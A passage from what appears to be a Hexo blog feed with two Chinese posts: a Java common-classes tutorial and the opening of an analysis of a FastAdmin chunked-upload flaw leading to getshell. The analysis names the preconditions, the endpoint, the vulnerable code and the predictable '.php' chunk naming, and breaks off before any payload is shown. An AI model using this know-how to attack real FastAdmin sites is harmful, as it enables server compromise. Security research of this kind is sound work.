      <link href="2021/06/02/Java%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"/>
      <url>2021/06/02/Java%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/image-20210602145457173.png" alt="image-20210602145457173"></p><p>基础捡起来，以前学校里面学的现在重新认识下。</p><h4 id="String-、StringBuffer和-StringBuilder"><a href="#String-、StringBuffer和-StringBuilder" class="headerlink" title="String 、StringBuffer和 StringBuilder"></a>String 、StringBuffer和 StringBuilder</h4><p>参考链接：<a href="https://blog.csdn.net/itchuxuezhe_yang/article/details/89966303" target="_blank" rel="noopener">String、StringBuffer与StringBuilder之间区别</a></p><p>三者相同之处：都是处理字符串</p><p>区别：</p><table><thead><tr><th>类</th><th>String</th><th>StringBuffer</th><th>StringBuilder</th></tr></thead><tbody><tr><td><strong>描述</strong></td><td>String类是常量，一旦创建无法改变。String的值是不可变的，这就导致每次对String的操作都会生成新的String对象，不仅效率低下，而且浪费大量优先的内存空间</td><td>StringBuffer是可变类，和线程安全的字符串操作类，任何对它指向的字符串的操作都不会产生新的对象。每个StringBuffer对象都有一定的缓冲区容量，当字符串大小没有超过容量时，不会分配新的容量，当字符串大小超过容量时，会自动增加容量</td><td>可变类，速度更快</td></tr><tr><td><strong>可变性</strong></td><td>不可变</td><td>可变</td><td>可变</td></tr><tr><td><strong>安全性</strong></td><td></td><td>线程安全</td><td>线程不安全</td></tr><tr><td><strong>性能</strong></td><td></td><td>多线程操作字符串</td><td>单线程操作字符串</td></tr></tbody></table><p>1、String是字符串常量，一旦创建无法改变。</p><p><code>Strings=&quot;hello&quot;;s=s+&quot; world&quot;;</code>内存变化：</p><p><img src="/imgs/image-20210602154215273.png" alt="image-20210602154215273"></p><p>2、StringBuffer和StringBuilder</p><p><code>StringBuffer s = new StringBuffer(&quot;hello&quot;);s.append(&quot; world&quot;);</code>跟上面内存不同之处在于，字符串的变化都在同一个地址，不会造成浪费。</p><p>3、equals三者用法不同，String.equals可以比较字符串的值因为其重写了该方法，而其它两个类没有重写，比较的话是比较object。</p><p>4、三者常用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String：length()、equals()、charAt()、indexOf()、toUpperCase()、startsWith()、endsWith()、contains()等</span><br><span class="line">StringBuffer、StringBuilder：length()、append()、insert()、delete()、deleteCharAt()、replace()等</span><br></pre></td></tr></table></figure><h4 id="System类与Runtime类"><a href="#System类与Runtime类" class="headerlink" title="System类与Runtime类"></a>System类与Runtime类</h4><h5 id="System"><a href="#System" class="headerlink" title="System"></a>System</h5><p>System类代表当前Java程序的运行平台，程序不能创建System类的对象，System类提供了一些类变量和类方法，允许直接通过System类来调用这些类变量和类方法。<strong>它不能被实例化</strong>。</p><p>System类提供的System包括</p><ol><li>标准输入System.in、标准输出System.out和错误输出流System.err; </li><li>访问外部定义的属性getenv和环境变量getProperties; </li><li>一种加载文件和库的方法loadLibrary;</li><li>用于快速复制阵列的一部分的实用方法arraycopy。</li></ol><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public void SystemTest() &#123;</span><br><span class="line">    &#x2F;&#x2F;标准输入流和输出流</span><br><span class="line">    System.out.println(&quot;请输入信息：&quot;);</span><br><span class="line">    Scanner scanner &#x3D; new Scanner(System.in);</span><br><span class="line">    System.out.println(scanner.nextLine());</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;获取系统信息</span><br><span class="line">    System.out.println(System.getenv());</span><br><span class="line">    System.out.println(System.getenv(&quot;LOCALAPPDATA&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;获取Java环境信息</span><br><span class="line">    System.out.println(System.getProperties());</span><br><span class="line">    System.out.println(System.getProperty(&quot;java.vm.version&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;获取当前时间</span><br><span class="line">    System.out.println(System.currentTimeMillis());</span><br><span class="line">    System.out.println(System.nanoTime());</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将指定源数组中的数组从指定位置复制到目标数组的指定位置</span><br><span class="line">    int[] src &#x3D; &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;;</span><br><span class="line">    int[] dest &#x3D; new int[10];</span><br><span class="line">    System.arraycopy(src, 2, dest, 1, 4);</span><br><span class="line">    for (int i : dest) &#123;</span><br><span class="line">        System.out.print(dest[i] + &quot;-&quot;); &#x2F;&#x2F;0-0-0-0-0-0-4-5-6-0-</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;加载库</span><br><span class="line">    System.out.println(&quot; Process of Library Loading &quot;);</span><br><span class="line">    Runtime.getRuntime().loadLibrary(&quot;C:&#x2F;Windows&#x2F;system&#x2F;FP30TXT.dll&quot;);</span><br><span class="line">    System.out.println(&quot;Process of Library Loading  completion&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;运行垃圾回收器</span><br><span class="line">    System.gc();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;终止虚拟机运行</span><br><span class="line">    System.exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>   Runtime类代表Java程序的<strong>运行时环境</strong>，可以访问JVM的相关信息，每个Java程序都有一个与之对应的Runtime实例，应用程序通过该对象与其运行时环境相连。应用程序<strong>不能创建自己的Runtime实例，但可以通过getRuntime()方法获取</strong>与之关联的Runtime对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public void RuntimeTest() throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;获取当前程序的环境</span><br><span class="line">        Runtime runtime &#x3D; Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;返回处理器个数</span><br><span class="line">        System.out.println(runtime.availableProcessors());</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;执行命令</span><br><span class="line">        String[] cmd &#x3D; new String[]&#123;&quot;ipconfig&quot;,&quot;&#x2F;a&quot;&#125;;</span><br><span class="line">        Process process &#x3D; runtime.exec(cmd);</span><br><span class="line">        &#x2F;&#x2F;取得命令结果的输出流,然后用一个读输出流类去读</span><br><span class="line">        InputStreamReader isr&#x3D;new InputStreamReader(process.getInputStream());</span><br><span class="line">        &#x2F;&#x2F;用缓冲器读行</span><br><span class="line">        BufferedReader br&#x3D;new BufferedReader(isr);</span><br><span class="line">        String line;</span><br><span class="line">        &#x2F;&#x2F;直到读完为止</span><br><span class="line">        while((line&#x3D;br.readLine())!&#x3D;null)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;获取JVM可用内存</span><br><span class="line">        System.out.println(runtime.freeMemory());</span><br><span class="line">        &#x2F;&#x2F;获取JVM尝试使用的最大内存</span><br><span class="line">        System.out.println(runtime.maxMemory());</span><br><span class="line">        &#x2F;&#x2F;获取JVM内存总量</span><br><span class="line">        System.out.println(runtime.totalMemory());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Math类和Random类"><a href="#Math类和Random类" class="headerlink" title="Math类和Random类"></a>Math类和Random类</h4><h5 id="Math：提供常用数学方法"><a href="#Math：提供常用数学方法" class="headerlink" title="Math：提供常用数学方法"></a>Math：提供常用数学方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">绝对值:ads()</span><br><span class="line">取整：ceil()、floor()</span><br><span class="line">四舍五入：round()</span><br><span class="line">随机数：random()</span><br><span class="line">最大最小值：max()、min()</span><br><span class="line">三角函数：sin()、cos()、tan()</span><br><span class="line">指数：exp()、power()</span><br><span class="line">对数：log()、ln()</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h5><p>除了Math类可以生成随机数之外，还有更加专业的Random类可以使用，Random有两种构造方法，分别是无参构造函数，以long为参数的构造方法。即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Random r1&#x3D;new Random();</span><br><span class="line">Random r2&#x3D;new Random(long seed);</span><br></pre></td></tr></table></figure><p>除了Character、Short、Byte之外，所有类型都可以使用Random类产生：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nextInt()      &#x2F;&#x2F;产生一个随机整数</span><br><span class="line">nextInt(int n) &#x2F;&#x2F;产生一个大于等于0小于n的整数</span><br><span class="line">nextFloat()    &#x2F;&#x2F;产生一个浮点数</span><br><span class="line">nextDouble()   &#x2F;&#x2F;</span><br><span class="line">nextLong()     &#x2F;&#x2F;产生一个长整数</span><br><span class="line">nextBoolean()  &#x2F;&#x2F;产生一个布尔值</span><br></pre></td></tr></table></figure><p><strong>UUID</strong>（Universally Unique Identifier）：通用唯一识别码，是一种软件建构的标准</p><h4 id="包装类（Boolean，Character，Byte，Short，Integer，Long，Float，Double）"><a href="#包装类（Boolean，Character，Byte，Short，Integer，Long，Float，Double）" class="headerlink" title="包装类（Boolean，Character，Byte，Short，Integer，Long，Float，Double）"></a>包装类（Boolean，Character，Byte，Short，Integer，Long，Float，Double）</h4><p>包装类 将基本数据类型的值包装为引用数据类型的对象。</p><table><thead><tr><th>基本类型</th><th>包装类</th></tr></thead><tbody><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr></tbody></table><p>装箱:将基本数据类型的值转为引用数据类型.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a &#x3D; 1;</span><br><span class="line">Integer i &#x3D; a;&#x2F;&#x2F;自动装箱</span><br></pre></td></tr></table></figure><p>拆箱:将引用数据类型的值转为基本数据类型.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Integer i &#x3D; new Integer(1);</span><br><span class="line">int a &#x3D; i;&#x2F;&#x2F;自动拆箱</span><br></pre></td></tr></table></figure><h4 id="Date类-Calendar类和DateForm类"><a href="#Date类-Calendar类和DateForm类" class="headerlink" title="Date类,Calendar类和DateForm类"></a>Date类,Calendar类和DateForm类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">public void DateTest()&#123;</span><br><span class="line">        Date date &#x3D; new Date();</span><br><span class="line">        System.out.println(date);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Full格式的日期格式器对象</span><br><span class="line">        DateFormat fullFormat &#x3D;</span><br><span class="line">                DateFormat.getDateInstance(DateFormat.FULL);</span><br><span class="line">        &#x2F;&#x2F; Long格式的日期格式器对象</span><br><span class="line">        DateFormat longFormat &#x3D;</span><br><span class="line">                DateFormat.getDateInstance(DateFormat.LONG);</span><br><span class="line">        &#x2F;&#x2F; MEDIUM格式的日期&#x2F;时间 格式器对象</span><br><span class="line">        DateFormat mediumFormat &#x3D; DateFormat.getDateTimeInstance(</span><br><span class="line">                DateFormat.MEDIUM, DateFormat.MEDIUM);</span><br><span class="line">        &#x2F;&#x2F; SHORT格式的日期&#x2F;时间格式器对象</span><br><span class="line">        DateFormat shortFormat &#x3D; DateFormat.getDateTimeInstance(</span><br><span class="line">                DateFormat.SHORT, DateFormat.SHORT);</span><br><span class="line">        &#x2F;&#x2F; 下面打印格式化后的日期或者日期&#x2F;时间</span><br><span class="line">        System.out.println(&quot;当前日期的完整格式为：&quot;</span><br><span class="line">                + fullFormat.format(date));</span><br><span class="line">        System.out.println(&quot;当前日期的长格式为：&quot;</span><br><span class="line">                + longFormat.format(date));</span><br><span class="line">        System.out.println(&quot;当前日期的普通格式为：&quot;</span><br><span class="line">                + mediumFormat.format(date));</span><br><span class="line">        System.out.println(&quot;当前日期的短格式为：&quot;</span><br><span class="line">                + shortFormat.format(date));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 获取表示当前时间的Calendar对象</span><br><span class="line">        Calendar calendar &#x3D; Calendar.getInstance();</span><br><span class="line">        &#x2F;&#x2F; 设置指定日期,将MONTH设为13</span><br><span class="line">        &#x2F;&#x2F;默认lenient模式,月份可以设置为13,加一年</span><br><span class="line">        calendar.set(Calendar.MONTH, 13);</span><br><span class="line">        System.out.println(calendar.getTime());</span><br><span class="line">        &#x2F;&#x2F; 开启non-lenient模式</span><br><span class="line">        calendar.setLenient(false);</span><br><span class="line">        calendar.set(Calendar.MONTH, 13);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#x2F;&#x2F;输出结果</span><br><span class="line">Wed Jun 02 17:30:27 CST 2021</span><br><span class="line">当前日期的完整格式为：2021年6月2日 星期三</span><br><span class="line">当前日期的长格式为：2021年6月2日</span><br><span class="line">当前日期的普通格式为：2021-6-2 17:30:27</span><br><span class="line">当前日期的短格式为：21-6-2 下午5:30</span><br><span class="line">Wed Feb 02 17:30:27 CST 2022</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://blog.csdn.net/itchuxuezhe_yang/article/details/89966303" target="_blank" rel="noopener">String、StringBuffer与StringBuilder之间区别</a></p><p><a href="https://blog.csdn.net/strivenoend/article/details/116487423" target="_blank" rel="noopener">狂神说–javase08–常用类学习</a></p><p><a href="https://blog.csdn.net/weixin_43915808/article/details/91474659" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43915808/article/details/91474659</a></p><p><a href="https://blog.csdn.net/qq_42402854/article/details/97004568" target="_blank" rel="noopener">Java System与Runtime类常用方法</a></p><p><a href="https://www.cnblogs.com/lbrs/p/11067221.html" target="_blank" rel="noopener">https://www.cnblogs.com/lbrs/p/11067221.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> JAVA基础 </category>
          
          <category> 常用类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastadmin最新文件上传漏洞可Getshell分析</title>
      <link href="2021/04/07/Fastadmin%E6%9C%80%E6%96%B0rce%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
      <url>2021/04/07/Fastadmin%E6%9C%80%E6%96%B0rce%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞详情："><a href="#一、漏洞详情：" class="headerlink" title="一、漏洞详情："></a>一、漏洞详情：</h3><p><img src="/imgs/image-20210407185344994.png" alt="image-20210407185344994"></p><p>从公开的<a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">文章</a>可以得到以下信息：</p><ol><li>漏洞利用需要<strong>普通用户权限</strong>并且配置开启了<strong>分片上传功能</strong></li><li>漏洞api在<code>index/ajax/upload</code></li><li>源码上传路径固定，可以推测出</li><li>漏洞位置<code>application/api/controller/Common.php#upload()</code></li></ol><h3 id="二、源码分析"><a href="#二、源码分析" class="headerlink" title="二、源码分析"></a>二、源码分析</h3><p>这里说明下，分片功能是在FastAdmin1.2.0版本才开始使用，所以下载的话从<a href="https://www.fastadmin.net/download/full.html?version=1.2.0.20201001_beta" target="_blank" rel="noopener">V1.2.0.20201001_beta</a>版本及之后的版本下载。</p><p><img src="/imgs/image-20210407175758926.png" alt="image-20210407175758926"></p><h4 id="1、upload-上传文件源码分析"><a href="#1、upload-上传文件源码分析" class="headerlink" title="1、upload() 上传文件源码分析"></a>1、upload() 上传文件源码分析</h4><p><code>application/api/controller/Common.php#upload()</code>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 上传文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ApiMethod</span> (POST)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> File $file 文件流</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Config::set(<span class="string">'default_return_type'</span>, <span class="string">'json'</span>);</span><br><span class="line">    <span class="comment">//必须设定cdnurl为空,否则cdnurl函数计算错误</span></span><br><span class="line">    Config::set(<span class="string">'upload.cdnurl'</span>, <span class="string">''</span>);</span><br><span class="line">    $chunkid = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">"chunkid"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($chunkid) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!Config::get(<span class="string">'upload.chunking'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(__(<span class="string">'Chunk file disabled'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">"action"</span>);</span><br><span class="line">        $chunkindex = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">"chunkindex/d"</span>);</span><br><span class="line">        $chunkcount = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">"chunkcount/d"</span>);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;request-&gt;post(<span class="string">"filename"</span>);</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;request-&gt;method(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> ($action == <span class="string">'merge'</span>) &#123;</span><br><span class="line">            $attachment = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//合并分片文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $upload = <span class="keyword">new</span> Upload();</span><br><span class="line">                $attachment = $upload-&gt;merge($chunkid, $chunkcount, $filename);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UploadException $e) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;success(__(<span class="string">'Uploaded successful'</span>), [<span class="string">'url'</span> =&gt; $attachment-&gt;url, <span class="string">'fullurl'</span> =&gt; cdnurl($attachment-&gt;url, <span class="keyword">true</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($method == <span class="string">'clean'</span>) &#123;</span><br><span class="line">            <span class="comment">//删除冗余的分片文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $upload = <span class="keyword">new</span> Upload();</span><br><span class="line">                $upload-&gt;clean($chunkid);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UploadException $e) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;success();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//上传分片文件</span></span><br><span class="line">            <span class="comment">//默认普通上传文件</span></span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $upload = <span class="keyword">new</span> Upload($file);</span><br><span class="line">                $upload-&gt;chunk($chunkid, $chunkindex, $chunkcount);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UploadException $e) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;success();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $attachment = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//默认普通上传文件</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $upload = <span class="keyword">new</span> Upload($file);</span><br><span class="line">            $attachment = $upload-&gt;upload();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UploadException $e) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($e-&gt;getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;success(__(<span class="string">'Uploaded successful'</span>), [<span class="string">'url'</span> =&gt; $attachment-&gt;url, <span class="string">'fullurl'</span> =&gt; cdnurl($attachment-&gt;url, <span class="keyword">true</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码逻辑：</p><ol><li>获取post参数chunkid，有chunkid的情况属于分片文件，没有就是普通文件上传</li><li>获取分片文件上传需要的参数值，包括action、chunkindex、chunkcount、filename</li><li>首先判断action值，merge的话指定将会合并文件、clean的话指定将会删除冗余文件，其它情况就认为是上传分片</li></ol><h4 id="2、chunk-分片上传源码分析"><a href="#2、chunk-分片上传源码分析" class="headerlink" title="2、chunk()分片上传源码分析"></a>2、chunk()分片上传源码分析</h4><p>点进<code>chunk($chunkid, $chunkindex, $chunkcount)</code>和<code>merge($chunkid, $chunkcount, $filename)</code>分别分析，两个方法在<code>application/common/library/upload.php</code>文件</p><p>chunk源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 分片上传</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> UploadException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chunk</span><span class="params">($chunkid, $chunkindex, $chunkcount, $chunkfilesize = null, $chunkfilename = null, $direct = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fileInfo[<span class="string">'type'</span>] != <span class="string">'application/octet-stream'</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UploadException(__(<span class="string">'Uploaded file format is limited'</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $destDir = RUNTIME_PATH . <span class="string">'chunks'</span>;</span><br><span class="line">    $fileName = $chunkid . <span class="string">"-"</span> . $chunkindex . <span class="string">'.part'</span>;</span><br><span class="line">    $destFile = $destDir . DS . $fileName;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($destDir)) &#123;</span><br><span class="line">        @mkdir($destDir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!move_uploaded_file(<span class="keyword">$this</span>-&gt;file-&gt;getPathname(), $destFile)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UploadException(__(<span class="string">'Chunk file write error'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    $file = <span class="keyword">new</span> File($destFile);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setFile($file);</span><br><span class="line">    <span class="keyword">return</span> $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk代码逻辑：</p><ol><li>判断Content-Type，需要是<code>application/octet-stream</code>才可以继续</li><li>分片文件名称以<code>chunkid-chunkindex.part</code>命名，形如123.php-0.part</li><li>destDir没有创建的话先创建，移动文件到目标文件</li></ol><h4 id="3、merge-合并分片文件源码分析"><a href="#3、merge-合并分片文件源码分析" class="headerlink" title="3、merge()合并分片文件源码分析"></a>3、merge()合并分片文件源码分析</h4><p>merge源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 